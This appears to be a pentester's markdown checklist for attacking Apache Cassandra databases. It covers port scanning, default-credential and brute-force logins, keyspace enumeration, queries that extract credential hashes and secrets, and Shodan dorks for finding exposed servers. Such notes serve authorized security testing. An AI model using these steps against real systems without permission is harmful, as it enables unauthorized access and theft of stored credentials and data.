# Cassandra Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating Apache Cassandra (ports 9042/9160), I realistically expect to find:

- [ ] Open service with no authentication required
- [ ] Weak or default credentials (e.g. `cassandra` / `cassandra` or `sa` with no password)
- [ ] Cluster metadata (version, rack, datacenter info)
- [ ] Keyspaces and table schemas
- [ ] Credential hashes in `system_auth.roles`
- [ ] Application data in other keyspaces
- [ ] Potential secrets or configs stored in plaintext

---

## ‚úÖ Cassandra Pentest Checklist

- [ ] **Port Discovery & Service Detection**
  - Identify open ports and version info.
    ```
    nmap -sV -p9042,9160 <IP>
    nmap -sV --script cassandra-info -p9042,9160 <IP>
    ```

- [ ] **Initial Connection (No Auth)**
  - Try default unauthenticated session.
    ```
    cqlsh <IP>
    ```

- [ ] **Credentialed Login**
  - Try known or brute-forced credentials.
    ```
    cqlsh <IP> -u cassandra -p cassandra
    cqlsh <IP> -u sa -p ''
    ```

- [ ] **Brute Force (if needed)**
  - Attempt username/password guessing.
    ```
    medusa -M cassandra -h <IP> -U users.txt -P passwords.txt -n 9042
    ```

- [ ] **Cluster / System Enumeration**
  - Pull system and version details.
    ```sql
    SELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version FROM system.local;
    ```

- [ ] **Keyspace Enumeration**
  - List available databases.
    ```sql
    SELECT keyspace_name FROM system_schema.keyspaces;
    ```
  - Describe tables in a keyspace.
    ```
    DESC <keyspace_name>;
    ```

- [ ] **Credential / Secrets Extraction**
  - Look for user or credential tables.
    ```sql
    DESC system_auth;
    SELECT * FROM system_auth.roles;
    SELECT * FROM logdb.user_auth;
    SELECT * FROM logdb.user;
    SELECT * FROM configuration."config";
    ```

- [ ] **Data Dumping**
  - Extract contents of interesting tables.
    ```sql
    SELECT * FROM <table>;
    ```

---

## ‚úÖ Notes & Tips

- Default ports are 9042 (native CQL) and 9160 (Thrift).
- Older installs often allow unauthenticated access.
- system_auth.roles table often contains hashed credentials.
- Cassandra native protocol versions (v3/v4/v5) indicate server version.
- Always check for reuse of extracted credentials elsewhere in the environment.

---

## ‚úÖ Example Commands

- **Anonymous connection test:**
    ```
    cqlsh <IP>
    ```
- **Authenticated connection:**
    ```
    cqlsh <IP> -u <username> -p <password>
    ```
- **Enumerate keyspaces:**
    ```sql
    SELECT keyspace_name FROM system_schema.keyspaces;
    ```
- **Describe keyspace schema:**
    ```
    DESC <keyspace_name>;
    ```
- **Extract potential creds:**
    ```sql
    SELECT * FROM system_auth.roles;
    ```

---

## ‚úÖ Shodan Dorks

- `port:9160 Cluster`
- `port:9042 "Invalid or unsupported protocol version"`
